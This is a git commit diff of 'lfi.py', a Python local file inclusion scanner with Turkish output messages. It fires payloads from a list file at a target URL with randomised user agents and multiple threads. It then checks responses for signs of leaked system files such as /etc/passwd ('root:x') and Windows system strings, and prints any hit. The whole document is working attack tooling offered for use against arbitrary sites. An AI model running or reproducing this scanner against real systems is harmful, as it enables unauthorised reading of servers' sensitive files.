0988557fa020f1bde4866bbed524a831a9c5c669
Dereli <mehmetserifpasa@gmail.com>
2020-06-14 19:26:05 +0300

    Update lfi.py

--- lfi.py
+++ lfi.py
@@ -1,10 +1,17 @@
-import requests, socket, sys, argparse, random, threading, OpenSSL,time
-from bs4 import BeautifulSoup
-from colorama import Fore, Style, init
+import os
+import sys
+import time
+import random
+import OpenSSL
+import argparse
+import requests
+from colorama import Fore, Style
+from concurrent.futures import ThreadPoolExecutor
 
 
-LFI_LISTS = [lfi.strip() for lfi in open("lfi.txt")]
-USERAGENT = [agent.strip() for agent in open('user-agents.txt')]
+print(os.cpu_count())
+LFI_LISTS = [lfi.strip() for lfi in open("PAYLOADS/lfi.txt")]
+USERAGENT = [agent.strip() for agent in open('PAYLOADS/useragent.txt')]
 TIME = time.time()
 
 
@@ -14,70 +21,65 @@ args = parse.parse_args()
 url = args.url
 
 
-increase_lfi_lists = 0
 class lfi_scanner:
 
     def __init__(self,host):
-        self.host = host
+        self.host = url
 
-    def output(self,put):
-        file = open("output.txt", "a")
-        file.writelines(str(put) + "\n")
 
-    def scans(self):
-        global increase_lfi_lists
-        global LFI_LISTS
+    def scans(self, LFI_LISTS):
+
         global USERAGENT
-        increase_lfi_lists +=1
+
         try:
-            req = requests.get(url + LFI_LISTS[increase_lfi_lists], headers={'User-Agent': random.choice(USERAGENT)}, timeout=2)
+
+            req = requests.get(self.host + LFI_LISTS, headers={'User-Agent': random.choice(USERAGENT)}, timeout=2)
             req_Text = req.text
-            if "root:x" in req_Text or \
-                    "noexecute=optout" in req_Text or \
-                    "OC_INIT_COMPONENT" in req_Text or \
-                    "C:\WINDOWS\system32\Setup\iis.dll" in req_Text:
+
+
+
+            if  "root:x"                             in req_Text or \
+                "noexecute=optout"                   in req_Text or \
+                "OC_INIT_COMPONENT"                  in req_Text or \
+                "C:\WINDOWS\system32\Setup\iis.dll"  in req_Text:
+
                 print(Fore.RED + "LFI BULUNDU ==>" + req.url + Style.RESET_ALL)
-                lfi_scanner(url).output(str("payload[" + str(increase_lfi_lists) + "] " + LFI_LISTS[increase_lfi_lists]) + "---" + str(req.url))
-                print(req_Text)
+                print(req_Text[0:50])
                 sys.exit()
+
             print(req.url)
+
+
+
         except requests.exceptions.ConnectionError:
+
             pass
+
         except OpenSSL.SSL.Error:
+
             pass
+
         except requests.exceptions.Timeout:
+
+            pass
+
+        except:
+
             pass
 
 
-thread = []
-p1 = lfi_scanner(url)
-for thr in range(len(LFI_LISTS)-1):
-    t1 = threading.Thread(target=p1.scans)
-    t1.daemon = True
-    thread.append(t1)
 
-for thr1 in thread:
-    thr1.start()
-    #time.sleep(0.005)
+with ThreadPoolExecutor(max_workers=os.cpu_count() * 5) as executor:
 
-for thr2 in thread:
-    thr2.join()
+    for _ in executor.map(lfi_scanner(url).scans, LFI_LISTS):
+
+        executor.shutdown(wait=True)
+
+        pass
 
 now_time = time.time() - TIME
 print("Geçen süre: "+str(now_time))
 sys.exit()
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
